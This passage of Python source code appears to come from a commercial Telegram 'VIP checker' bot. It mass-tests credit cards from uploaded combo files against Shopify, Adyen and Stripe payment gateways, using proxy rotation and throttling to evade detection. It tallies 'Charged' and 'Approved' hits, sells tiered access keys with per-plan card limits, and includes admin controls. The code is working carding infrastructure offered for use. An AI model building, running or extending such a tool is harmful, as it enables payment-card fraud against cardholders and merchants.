            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
            raw_c = args[0].strip() if args else ""
            c = unsf(raw_c)
            kdb = await load_keys()
            if not c: return await styled_reply(update, f"{CE_FLASH} {sf('Format')}: <code>/validate [Key]</code>", use_gif=True)
            if c not in kdb: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Key not found in database.')}</b>", use_gif=True)
            ki = kdb[c]
            u = ki.get("used", False)
            ub = ki.get("used_by")
            st = "Used" if u else "Active"
            m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
            if u and ub and str(ub).isdigit():
                prof_name = escape_html(_USER_NAMES.get(int(ub), f"User {ub}"))
                m += f"\n\n├ <b>{CE_SMILE} {sf('Redeemed By')}:</b> <code>{sf(str(ub))}</code> <a href='tg://user?id={ub}'>[{prof_name}]</a>\n╰ <b>{CE_CHART} {sf('Redeem Time')}:</b> <code>{sf(ki.get('redeemed_at', 'Not yet'))}</code>"
            await styled_reply(update, m, use_gif=True)
        elif cmd == "maint":
            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
            a = args[0].strip().lower() if args else ""
            if a: _MAINTENANCE_MODE = (a == 'on')
            else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
            t = "ON" if _MAINTENANCE_MODE else "OFF"
            await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf(t)}", use_gif=True)
        elif cmd in ["users", "user"]:
            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
            active_info = []
            for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
                if not p.get("stopped"):
                    un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                    gate = p.get("gate", "Unknown")
                    total = p.get("total", "?")
                    active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
            recent_users_info = []
            sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15]
            for u, _ in sorted_users:
                un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                recent_users_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
            text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
            if recent_users_info: text += f"├ <b>{sf('Recent Users')}:</b>\n" + "\n".join(recent_users_info) + "\n\n"
            else: text += f"├ <b>{sf('Recent Users')}:</b> <code>{sf('None')}</code>\n\n"
            text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
            if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
            else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
            await styled_reply(update, text, use_gif=True)
        elif cmd == "revoke":
            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
            if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
            try: tu = int(unsf(args[0].strip()))
            except Exception: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
            await set_user_plan(tu, "Free", 0)
            proc = ACTIVE_MTXT_PROCESSES.get(tu)
            if proc:
                proc["stopped"] = True
                for t in proc.get("tasks", []):
                    if not t.done(): t.cancel()
            admin_msg = f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
            await styled_reply(update, admin_msg, use_gif=True)
            try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
            except Exception: pass
        else:
            await styled_reply(update, f"<b>{CE_THINK1} {sf('Unknown Command!')}</b>\n\n╰ {sf('Type /start to see available commands.')}", use_gif=True)
    except Exception as e:
        logger.error(f"Error handling command {cmd}: {e}")
        await styled_reply(update, f"<b>{CE_CLOWN} {sf('System Error')}</b>\n\n╰ {sf('An unexpected error occurred while processing your request.')}", use_gif=True)

async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    cp = await get_user_plan(uid)
    t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
    for _, pi in PLANS.items():
        t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
    t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
    kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069"), InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    q = update.callback_query
    uid = q.from_user.id
    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
    plan = await get_user_plan(uid)
    limit = get_cc_limit(plan, uid)
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM V2')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ├ {CE_CANDLE} /chkpxy - {sf('Test Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    kb = [
        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
    ]
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    elif is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
    elif is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
    await styled_edit(q.message, t, buttons=kb)
    await q.answer()

async def prompt_redeem_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    t = f"<b>{CE_CANDLE} {sf('Please send your key using the command directly like this')} :</b>\n\n<code>/redeem VIP-XXXXXXXXXX</code>"
    kb = [[InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
    await styled_edit(q.message, t, buttons=kb)

async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    if uid in ADMIN_ID:
        await q.answer("✅ Admin Access", show_alert=True)
        try: await q.message.delete()
        except: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
        return
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        await mark_user_joined(uid)
        _JOIN_CACHE[uid] = time.time()
        await q.answer("✅ Verified Successfully!", show_alert=True)
        try: await q.message.delete()
        except Exception: pass
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(context.bot, uid, plan, limit)
    else: await q.answer("❌ Not joined yet!", show_alert=True)

async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    q = update.callback_query
    uid = q.from_user.id
    gn = q.data.split(":")[1]
    await q.answer()
    msg_obj = q.message
    if gn == "cancel":
        PENDING_FILES.pop(uid, None)
        return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
    cards = PENDING_FILES.pop(uid, None)
    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
    workers_val = WORKERS_CONFIG.get(gn)
    current_workers = workers_val() if callable(workers_val) else workers_val
    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n├ <b>{CE_FLASH} {sf('CPM Target')}:</b> <code>{sf(str(CPM_TARGET))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))

async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
    uid = update.effective_user.id
    tot = len(cards)
    chk = chg = app = ins = dec = err = 0
    st = time.time()
    sites = await get_shopify_sites() if gate_name == "Shopify" else []
    proxies = await get_all_user_proxies(uid)
    proxies = list(proxies) if proxies else []
    http_session = await get_user_http_session(uid)
    last_resp = sf("Waiting for response...")
    def is_stopped():
        return process_store.get(uid, {}).get("stopped", False)
    workers_val = WORKERS_CONFIG.get(gate_name)
    current_workers = workers_val() if callable(workers_val) else workers_val
    cpm_ctrl = CPMController(CPM_TARGET)
    hit_tasks = []
    proxy_rotator = ProxyRotator(proxies)

    async def dashboard_updater():
        while not is_stopped():
            for _ in range(20):
                if is_stopped(): break
                await asyncio.sleep(0.1)
            if is_stopped(): break
            elapsed_now = int(time.time() - st)
            cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
            dt = f"""<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>

├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>
├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>
├ <b>{CE_FLASH} {sf('CPM Target')}:</b> <code>{sf(str(CPM_TARGET))}</code>
├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>
╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"""
            percent = int((chk / tot) * 100) if tot > 0 else 0
            kb = [
                [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
                [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
                [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
                [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
                [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
            ]
            try:
                await styled_edit(msg_obj, dt, buttons=kb)
            except asyncio.CancelledError:
                break
            except Exception:
                pass

    ut = asyncio.create_task(dashboard_updater())
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    sem = asyncio.Semaphore(current_workers)

    async def worker(wid):
        nonlocal chk, chg, app, ins, dec, err, last_resp
        while not queue.empty() and not is_stopped():
            async with sem:
                if queue.empty() or is_stopped():
                    break
                try:
                    card = queue.get_nowait()
                except Exception:
                    break
                try:
                    await cpm_ctrl.wait()
                    # Dynamic delay based on gateway
                    if gate_name == "Shopify":
                        await asyncio.sleep(2.0)
                    elif gate_name == "Adyen":
                        await asyncio.sleep(1.0)
                    elif gate_name == "Stripe":
                        await asyncio.sleep(0.8)
                    else:
                        await asyncio.sleep(5.0)
                    if is_stopped():
                        queue.task_done()
                        break
                    c_st = time.time()
                    res = await check_card_real(card, sites, proxies, http_session, gate_name, uid)
                    if is_stopped():
                        queue.task_done()
                        break
                    c_el = time.time() - c_st
                    status = res.get('status', 'Dead')
                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                    chk += 1
                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                    if status == 'Charged':
                        chg += 1
                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
                        hit_tasks.append(ht_task)
                    elif status == 'Approved':
                        app += 1
                    elif status == 'Insufficient':
                        ins += 1
                    elif status == 'Dead':
                        dec += 1
                    elif status == 'Site Error':
                        err += 1
                    else:
                        dec += 1
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    err += 1
                    chk += 1
                    last_resp = sf(f"Sys Err: {str(e)[:20]}")
                queue.task_done()

    wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
    process_store[uid]["tasks"] = wt + [ut]
    await asyncio.gather(*wt, return_exceptions=True)
    if not ut.done():
        ut.cancel()
    if hit_tasks:
        await asyncio.gather(*hit_tasks, return_exceptions=True)
    el = int(time.time() - st)
    h, m, s = el // 3600, (el % 3600) // 60, el % 60
    avg_cpm = int((chk / el) * 60) if el > 0 else 0
    ft = f"""<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>

├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>
├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(current_workers))}</code>
├ <b>{CE_FLASH} {sf('CPM Target')}:</b> <code>{sf(str(CPM_TARGET))}</code>
├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>
╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"""
    fkb = [
        [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
        [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
        [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
        [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
    ]
    try:
        await styled_edit(msg_obj, ft, buttons=fkb)
    except Exception:
        pass
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_data = update.callback_query.data
    puid = int(key_data.split(":")[1])
    if update.callback_query.from_user.id != puid and update.callback_query.from_user.id not in ADMIN_ID:
        return await update.callback_query.answer("⚠️ Not yours!", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_shopify_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
    try:
        await init_db()
    except Exception as e:
        logger.error(f"DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    bot_defaults = Defaults(parse_mode=ParseMode.HTML, link_preview_options=LinkPreviewOptions(is_disabled=True))
    app = Application.builder().token(BOT_TOKEN).defaults(bot_defaults).read_timeout(60).write_timeout(60).connect_timeout(60).post_init(post_init).build()
    app.add_error_handler(global_error_handler)
    app.add_handler(MessageHandler(filters.ALL, master_router))
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    logger.info("✅ VIP BOT V2 IS FULLY OPERATIONAL WITH ENHANCED CHECK ENGINE!")
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict:
            time.sleep(5)
        except Exception as e:
            logger.error(f"Fatal error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
